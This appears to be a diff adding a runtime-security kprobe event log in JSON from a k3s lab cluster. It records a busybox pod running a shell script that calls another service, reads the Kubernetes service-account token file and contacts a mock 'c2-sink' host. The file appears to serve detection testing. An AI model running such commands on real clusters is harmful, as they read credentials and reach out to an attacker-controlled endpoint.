@@ -1,0 +1,110 @@
+{
+  "process_kprobe": {
+    "process": {
+      "exec_id": "b3Jic3RhY2s6NDMyNDgzOTM4NTYxMzoyNzY0NA==",
+      "pid": 27644,
+      "uid": 0,
+      "cwd": "/",
+      "binary": "/bin/sh",
+      "arguments": "-c \"\n  wget -q -T5 -O- http://service-b.zta-ssf.svc.cluster.local:8080/ >/dev/null 2>&1\n  cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1\n  wget -q -T5 -O- http://c2-sink.zta-ssf.svc.cluster.local:9666/ >/dev/null 2>&1\n\"",
+      "flags": "execve",
+      "start_time": "2026-07-05T19:21:06.331440705Z",
+      "auid": 0,
+      "pod": {
+        "namespace": "zta-ssf",
+        "name": "service-a-trial-5d48cc477c-9blhf",
+        "uid": "055762e9-8c0b-4446-ad4b-77fac67207a8",
+        "container": {
+          "id": "docker://5333b3585114b32c95d5e5f5cf6aec94c741938f511273c12ca8d22663715871",
+          "name": "service-a",
+          "image": {
+            "id": "docker-pullable://busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662",
+            "name": "busybox:1.36"
+          },
+          "start_time": "2026-07-05T19:01:35Z",
+          "pid": 44,
+          "security_context": {}
+        },
+        "pod_labels": {
+          "app": "service-a",
+          "pod-template-hash": "5d48cc477c",
+          "security.istio.io/tlsMode": "istio",
+          "service.istio.io/canonical-name": "service-a",
+          "service.istio.io/canonical-revision": "latest",
+          "spiffe.io/spire-managed-identity": "true",
+          "variant": "trial"
+        },
+        "workload": "service-a-trial",
+        "workload_kind": "Deployment"
+      },
+      "docker": "5333b3585114b32c95d5e5f5cf6aec9",
+      "parent_exec_id": "b3Jic3RhY2s6NDMyNDgzODMxNjExODoyNzYzOA==",
+      "refcnt": 1,
+      "tid": 27644,
+      "in_init_tree": false
+    },
+    "parent": {
+      "exec_id": "b3Jic3RhY2s6NDMyNDgzODMxNjExODoyNzYzOA==",
+      "pid": 27638,
+      "uid": 0,
+      "cwd": "/",
+      "binary": "/bin/sh",
+      "arguments": "-c \"\n  wget -q -T5 -O- http://service-b.zta-ssf.svc.cluster.local:8080/ >/dev/null 2>&1\n  cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1\n  wget -q -T5 -O- http://c2-sink.zta-ssf.svc.cluster.local:9666/ >/dev/null 2>&1\n\"",
+      "flags": "execve rootcwd clone",
+      "start_time": "2026-07-05T19:21:06.330371043Z",
+      "auid": 0,
+      "pod": {
+        "namespace": "zta-ssf",
+        "name": "service-a-trial-5d48cc477c-9blhf",
+        "uid": "055762e9-8c0b-4446-ad4b-77fac67207a8",
+        "container": {
+          "id": "docker://5333b3585114b32c95d5e5f5cf6aec94c741938f511273c12ca8d22663715871",
+          "name": "service-a",
+          "image": {
+            "id": "docker-pullable://busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662",
+            "name": "busybox:1.36"
+          },
+          "start_time": "2026-07-05T19:01:35Z",
+          "pid": 38,
+          "security_context": {}
+        },
+        "pod_labels": {
+          "app": "service-a",
+          "pod-template-hash": "5d48cc477c",
+          "security.istio.io/tlsMode": "istio",
+          "service.istio.io/canonical-name": "service-a",
+          "service.istio.io/canonical-revision": "latest",
+          "spiffe.io/spire-managed-identity": "true",
+          "variant": "trial"
+        },
+        "workload": "service-a-trial",
+        "workload_kind": "Deployment"
+      },
+      "docker": "5333b3585114b32c95d5e5f5cf6aec9",
+      "parent_exec_id": "b3Jic3RhY2s6MzM3NzUyNjQyNDE4ODoyMzEzNQ==",
+      "tid": 27638,
+      "in_init_tree": false
+    },
+    "function_name": "__arm64_sys_execve",
+    "args": [
+      {
+        "string_arg": "/bin/wget"
+      }
+    ],
+    "action": "KPROBE_ACTION_POST",
+    "policy_name": "emit-exec-service-a",
+    "return_action": "KPROBE_ACTION_POST"
+  },
+  "node_name": "orbstack",
+  "time": "2026-07-05T19:21:06.331515538Z",
+  "node_labels": {
+    "beta.kubernetes.io/arch": "arm64",
+    "beta.kubernetes.io/instance-type": "k3s",
+    "beta.kubernetes.io/os": "linux",
+    "kubernetes.io/arch": "arm64",
+    "kubernetes.io/hostname": "orbstack",
+    "kubernetes.io/os": "linux",
+    "node-role.kubernetes.io/control-plane": "true",
+    "node.kubernetes.io/instance-type": "k3s"
+  }
+}
